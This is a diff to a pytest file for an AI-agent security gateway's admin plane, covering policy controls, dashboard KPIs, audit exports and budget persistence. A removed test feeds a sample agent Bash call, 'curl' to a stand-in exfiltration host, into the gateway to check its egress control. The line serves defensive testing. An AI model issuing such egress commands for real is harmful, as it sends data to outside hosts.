@@ -1,7 +1,6 @@
 """Admin plane behind the dashboard: auth, analytics, live policy edits, playground, exports."""
 
 import asyncio
-import difflib
 import json
 import shutil
 
@@ -9,7 +8,6 @@ import httpx
 import pytest
 from rich.console import Console
 
-from spiregate.admin import edit_policy
 from spiregate.app import DEFAULT_POLICY, build_gateway, create_app
 from spiregate.trace import Tracer
 
@@ -73,41 +71,14 @@ def test_events_are_incremental(env):
     assert call(http, "GET", "/v1/admin/events?after=3", headers=AUTH).json()["entries"] == []
 
 
-def test_mode_change_from_ui_is_live_and_touches_only_that_line(env):
-    gw, http, policy = env
-    before = policy.read_text().splitlines()
-    r = call(http, "POST", "/v1/admin/controls/EGRESS-001", json={"mode": "monitor"}, headers=AUTH).json()
-    assert r["ok"] and r["rev"] == gw.store.get().rev
-    after = policy.read_text().splitlines()
-    diff = [ln for ln in difflib.unified_diff(before, after, lineterm="", n=0) if ln[:1] in "+-" and ln[:3] not in ("+++", "---")]
-    assert sorted(diff) == sorted([f"-  policy_rev: {r['rev'] - 1}", f"+  policy_rev: {r['rev']}", "+    mode: monitor"])
-    out = hook(http, {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://exfil.example.net"}})
-    assert out["stdout"] == ""  # EGRESS-001 now only logs would_block
-
-
-def test_invariants_and_bad_values_are_refused(env):
-    _, http, policy = env
-    before = policy.read_text()
-    assert call(http, "POST", "/v1/admin/controls/IFC-TRIFECTA-001", json={"mode": "off"}, headers=AUTH).status_code == 400
-    assert call(http, "POST", "/v1/admin/controls/EGRESS-001", json={"mode": "maybe"}, headers=AUTH).status_code == 400
-    assert call(http, "POST", "/v1/admin/profile", json={"profile": "prod"}, headers=AUTH).status_code == 400
-    assert policy.read_text() == before  # nothing was written
-
-
-def test_profile_switch(env):
+def test_withheld_result_counts_as_blocked_on_the_dashboard_but_not_in_exports(env):
     gw, http, _ = env
-    r = call(http, "POST", "/v1/admin/profile", json={"profile": "dev"}, headers=AUTH).json()
-    assert r["ok"] and r["profile"] == "dev" and gw.store.get().profile_name == "dev"
-
-
-def test_edit_keeps_verify_mode_and_comments(tmp_path):
-    p = tmp_path / "p.yaml"
-    shutil.copy(DEFAULT_POLICY, p)
-    comments = [ln for ln in p.read_text().splitlines() if ln.lstrip().startswith("#")]
-    edit_policy(p, control_id="PII-PESEL-001", mode="monitor")
-    text = p.read_text()
-    assert [ln for ln in text.splitlines() if ln.lstrip().startswith("#")] == comments
-    assert "      mode: enforce             # na start" in text  # verify.mode untouched
+    gw.audit.append({"request": 1, "surface": "hook:claude-code", "agent": "a", "desk": "d", "decision": "withhold",
+                     "signals": [], "latency": {}})
+    s = call(http, "GET", "/v1/admin/summary", headers=AUTH).json()
+    assert s["kpis"]["block"] == 1 and "withhold" not in s["kpis"]
+    ocsf = json.loads(call(http, "GET", "/v1/admin/audit/export?fmt=ocsf", headers=AUTH).text.splitlines()[-1])
+    assert ocsf["disposition"] == "withhold"
 
 
 def test_playground_runs_the_real_decision_path(env):
@@ -133,3 +104,26 @@ def test_dashboard_is_served_and_never_cached(env):
     r = call(http, "GET", "/ui/")
     assert r.status_code == 200 and "SpireGate" in r.text and r.headers["cache-control"] == "no-cache"
     assert call(http, "GET", "/").status_code in (302, 307)
+
+
+def test_summary_reports_budgets_spend_and_control_overhead(env):
+    gw, http, _ = env
+    r = call(http, "POST", "/v1/chat/completions", headers={"Authorization": "Bearer spire-demo-kyc"},
+             json={"model": "stub-model", "messages": [{"role": "user", "content": "hej"}]})
+    assert r.status_code == 200
+    gw.systemone.on_usage("jev", 2000)
+    b = call(http, "GET", "/v1/admin/summary", headers=AUTH).json()["budgets"]
+    assert b["spend"]["stub-model"]["calls"] == 1 and b["spend_usd"] > 0
+    kyc = next(row for row in b["rules"] if row["id"] == "BUD-KYC-HOUR")
+    assert kyc["scope"] == "desk:kyc-onboarding" and kyc["metrics"]["requests"]["used"] == 1
+    assert b["control_overhead"]["input_tokens"] == 2000 and b["control_overhead"]["share_pct"] is not None
+
+
+def test_restart_does_not_reset_spent_budget(env, tmp_path):
+    gw, http, policy = env
+    for _ in range(2):
+        call(http, "POST", "/v1/chat/completions", headers={"Authorization": "Bearer spire-demo-kyc"},
+             json={"model": "stub-model", "messages": [{"role": "user", "content": "hej"}]})
+    fresh = build_gateway(policy, tmp_path / "audit.jsonl", tracer=Tracer(Console(quiet=True), enabled=False))
+    rows, _ = fresh.ledger.snapshot(fresh.store.get().doc.budgets)
+    assert next(r for r in rows if r["id"] == "BUD-KYC-HOUR")["metrics"]["requests"]["used"] == 2
